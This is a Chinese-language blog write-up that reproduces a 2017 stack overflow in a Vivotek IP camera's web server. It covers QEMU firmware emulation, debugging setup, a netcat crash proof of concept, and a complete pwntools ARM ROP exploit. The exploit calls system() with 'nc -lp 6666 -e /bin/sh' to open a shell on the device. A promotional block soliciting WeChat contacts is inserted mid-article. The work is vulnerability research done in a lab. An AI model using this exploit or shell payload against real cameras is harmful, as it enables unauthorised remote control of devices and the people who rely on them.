# 一、前言

​ 近日公司进了一批摄像头，以前还没有做过这方面的研究所以找了一个vivotek 2017年的栈溢出漏洞拿来练练手。

# 二、固件仿真

​ 虚拟机环境：Ubuntu 20.04

​ gdb版本：GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2

​
固件下载地址：<https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip>

​ 从上面的地址下载还有漏洞的固件，使用binwalk分离出来文件系统，发现问题文件httpd位于/usr/sbin目录下，使用file命令查看文件类型。

![image-20220628102309459.png](https://image.3001.net/images/20220708/1657281749_62c81cd5a51e28a227428.png!small)

​ 因为是arm架构的所以没法在本地跑，使用QEMU模拟运行。

![image-20220628103137289.png](https://image.3001.net/images/20220708/1657281750_62c81cd67b94a30b7954f.png!small)

​ 因为QEMU模拟的环境不会挂载dev和proc，所以我们这边将固件系统的这两个目录挂载到虚拟机的dev和proc中。

``

    
    
    sudo mount -o bind /dev ./squashfs-root/dev/
    sudo mount -t proc /proc/ ./squashfs-root/proc/

​ 再次运行httpd文件，发现这次报了其他的错误。

![image-20220628103357817.png](https://image.3001.net/images/20220708/1657281751_62c81cd7514fbe1137499.png!small)

​ 打开ida定位报错语句的位置，可以看到/etc/conf.d/boa/boa.conf文件打开失败导致的。

![image-20220628103517344.png](https://image.3001.net/images/20220708/1657281752_62c81cd82fc3a1d231cdd.png!small)

​ 本地ls查看会发现conf.d是链接到/mnt/flash/etc/conf.d的，并且该目录为空。

![image-20220628104656245.png](https://image.3001.net/images/20220708/1657281752_62c81cd8dcf7ec10cf66f.png!small)

​ 尝试在其他目录中寻找boa.conf文件，最终在如下的目录找到了它，将此目录下的/etc复制到/mnt/flash/目录下。

![image-20220628103759277.png](https://image.3001.net/images/20220708/1657281753_62c81cd9dc7ef7fad2327.png!small)

​ 再次运行httpd文件，发现报了如下错误。

![image-20220628111537415.png](https://image.3001.net/images/20220708/1657281754_62c81cdab55ac9ff4f4c9.png!small)

​
老办法通过IDA搜索报错字符串，定位到如下位置，可以发现报错原因是因为此程序中使用gethostname函数将主机名保存在rlimits中，并使用gethostbyname函数通过主机名找到IP地址。但是最终因为我们的主机名与固件中的主机名不同所以无法获取到IP地址。

![image-20220628111658247.png](https://image.3001.net/images/20220708/1657281755_62c81cdb7d1851792e0f5.png!small)

​ 这里我们可以通过hostname命令查看本机名，然后以我的本机名为例修改squashfs-root/etc/hosts中的内容

    
    
    echo "127.0.0.1 amall-virtual localhost" > squashfs-root/etc/hosts

​ 修改完成后再次运行httpd文件，可以看到已经成功启动。

![image-20220628114234518.png](https://image.3001.net/images/20220708/1657281756_62c81cdc367528e035e91.png!small)

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

# 三、漏洞分析

​ 我们根据poc来验证漏洞

``

    
    
    echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | netcat -v 127.0.0.1 80

``

![image-20220628114449034.png](https://image.3001.net/images/20220708/1657281757_62c81cdd065e086283da7.png!small)

验证成功，可以看到程序崩溃信息。我们根据poc可以了解到漏洞是在Content-Length中出现的，从IDA中搜索字符串然后查看交叉引用定位到漏洞位置所在。

![image-20220628114657191.png](https://image.3001.net/images/20220708/1657281757_62c81cddea137bb504bb4.png!small)

根据反汇编的代码我们可以了解到，程序在处理Content-Length字符串的内容时，使用strncpy函数保存从`:`到`\n`之间的字符串，但是可以看到其中并没有对长度进行检测导致了用户可以输入任意长度的字符串造成栈溢出。

# 四、漏洞复现

​ 在arm的栈溢出中，我们首要考虑的就是如何劫持pc寄存器，而这个偏移可以通过动调获得。

​ 看一下保护，开启了NX保护所以无法利用shellcode，考虑使用ROP来绕过NX保护。

![image-20220628133704852.png](https://image.3001.net/images/20220708/1657281758_62c81cdeb7abaa68daddf.png!small)

​
为了能够查看程序的执行流程，这里选择将文件系统和gdbserver一起传到qemu虚拟机里，下面的内容根据[driverxdw](<https://xz.aliyun.com/t/5054#toc-2>)师傅的这篇文章整理得到。

​ 从arm-debian的qemu镜像地址下载如下三个文件

``

`<https://people.debian.org/>~aurel32/qemu/armel/vmlinuz-3.2.0-4-versatile`

`<https://people.debian.org/>~aurel32/qemu/armel/initrd.img-3.2.0-4-versatile`

`<https://people.debian.org/>~aurel32/qemu/armel/debian_wheezy_armel_standard.qcow2`

​ 在本地新建一张网卡用于和qemu虚拟机通信

``

    
    
    sudo tunctl -t tap0 -u `whoami`
    sudo ifconfig tap0 192.168.2.1/24

​ 启动qemu虚拟机镜像

    
    
    qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append "root=/dev/sda1"  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic

​ 启动成功后会让你输入用户名密码，默认用户名/密码：root/root，然后在qemu虚拟机中配置网卡信息，这样qemu虚拟机就可以和本地进行通信了

`ifconfig eth0 192.168.2.2/24`

​ 接下来使用ftp把固件的文件系统get到qemu虚拟机中，此时我们就可以挂载/dev和/proc了。

``

    
    
    mount -o bind /dev ./squashfs-root/dev
    mount -t proc /proc/ ./squashfs-root/proc/

​ 最后切换到固件的文件系统中，并运行漏洞文件

``

    
    
    chroot squashfs-root sh
    ./usr/sbin/httpd

​ 这时我们就可以开始调试工作了，采用gdb-multiarch&gdbserver的方式。但是在试过网上编译好的gdbserver以后都无法在远程target
remote到，最后在[这篇文章](<https://bbs.pediy.com/thread-220907.htm>)中找到了答案，按照上面的步骤我编译了一份与我本地gdb版本相同的gdbserver-static，文件上传到github上了有需要的师傅可以自行下载。

​ github地址：<https://github.com/AmaIIl/gdbserver-static-9.2-arm>

​ 有了对应版本的gdbserver就可以开始远程调试了，具体命令如下所示

    
    
    ./gdbserver-static 127.0.0.1:1234 --attach <server pid>

​ 然后写一个gdbinit把重复的命令写进去方便调试

``

    
    
    # gdb-multiarch -x gdbinit
    file ./usr/sbin/httpd
    set architecture arm
    target remote 192.168.2.2:1234

​
我们将断点下在函数退栈的位置，然后计算其与输入地址的差值就可以得到溢出偏移。为了降低利用难度这里关闭qemu虚拟机的aslr保护，可以节省几步内存泄露的步骤。

    
    
    sudo sysctl -w kernel.randomize_va_space=0

​
通过动调我们可以得到需要的所有条件：溢出偏移、栈地址、libc地址。但是要构造ROP还需要一些gadget，使用ropper搜索我们需要的gadget，最终我们需要构造的就是system("XXX")的效果，所以需要能控制pc和r0寄存器的gadget，同时因为程序漏洞使用strncpy函数所以gadget中不能含有零字符，所以最终选择了这两段gadget

``

    
    
    0x00048784: pop {r1, pc};
    0x00016aa4: mov r0, r1; pop {r4, r5, pc};

exp如下所示

``

    
    
    from pwn import *
    
    context.log_level = 'debug'
    
    r = lambda : p.recv()
    
    rx = lambda x: p.recv(x)
    
    ru = lambda x: p.recvuntil(x)
    
    rud = lambda x: p.recvuntil(x, drop=True)
    
    s = lambda x: p.send(x)
    
    sl = lambda x: p.sendline(x)
    
    sa = lambda x, y: p.sendafter(x, y)
    
    sla = lambda x, y: p.sendlineafter(x, y)
    
    close = lambda : p.close()
    
    debug = lambda : gdb.attach(p)
    
    shell = lambda : p.interactive()
    
    p = remote('192.168.2.2', 80)
    
    libc = ELF('./squashfs-root/lib/libc.so.0')
    
    stack = 0xbeffeb64
    
    base = 0xb6f2d000
    
    system = base+libc.sym['system']
    
    pop_r1_pc = 0x00048784+base
    
    mov_r0_r1 = 0x00016aa4+base # mov r0, r1; pop {r4, r5, pc}; 
    
    head = "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:"
    
    payload = 'b'*(0x00003c-8)+p32(pop_r1_pc)+p32(stack)+p32(mov_r0_r1)+'b'*8+p32(system)
    
    end = 'nc  -lp 6666 -e /bin/sh;'+'\r\n\r\n'
    
    sl(head+payload+end)
    
    shell()

脚本执行成功后会开启6666端口，这时只要用nc远程连接即可getshell。

![image-20220628095814960.png](https://image.3001.net/images/20220708/1657281759_62c81cdfa9625f2197ba5.png!small)

# 五、总结

​
还是那个感觉，复现iot最难的步骤还是环境搭建。在gdbserver那里卡住了很久，本地编译也是各种报错，不过好在最后都一一解决了。2017年的这个栈溢出漏洞整体利用难度不算高，感兴趣的师傅们可以动手试着复现一下。

